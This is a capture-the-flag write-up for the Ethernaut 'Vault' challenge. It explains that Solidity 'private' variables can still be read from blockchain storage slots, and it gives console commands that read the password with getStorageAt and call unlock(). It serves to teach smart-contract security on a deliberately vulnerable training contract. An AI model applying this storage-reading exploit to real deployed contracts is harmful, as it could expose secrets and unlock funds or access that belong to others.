---
layout: writeup
title: "Vault"
level: "Intermediate"
category: "Ethernaut"
description: "Unlock a vault by reading 'private' storage data directly from the blockchain."
---

## Analysis

The `Vault` contract is locked and requires a `password` to open. The password is stored as a `private` variable:
`bytes32 private password;`

**The Flaw:**
In Solidity, the `private` keyword only prevents **other contracts** from reading the variable. It does not hide the data from the outside world. All state variables are stored in **Storage Slots** (32-byte chunks). 



Since the `locked` boolean is the first variable (Slot 0) and the `password` is the second variable (Slot 1), we can use a web3 provider to query the data sitting in Slot 1 of the contract's address directly.

---

## Solution

You don't need to deploy a contract for this. You can solve it using the browser console by querying the storage of the instance.

**Step-by-Step:**

1.  **Identify the Slot:** The `locked` variable (boolean) takes up Slot 0. The `password` (`bytes32`) takes up Slot 1.
2.  **Read the Storage:** Use `web3.eth.getStorageAt` to pull the hex data from Slot 1.
3.  **Unlock:** Pass that hex value into the `unlock()` function.

**Console Commands:**

```javascript
// 1. Read the hex data from storage slot 1
const password = await web3.eth.getStorageAt(instance, 1);

// 2. Check the value (it will be a hex string)
console.log("Found Password:", password);

// 3. Use the password to unlock the vault
await contract.unlock(password);

// 4. Verify the vault is unlocked
await contract.locked(); // Should return false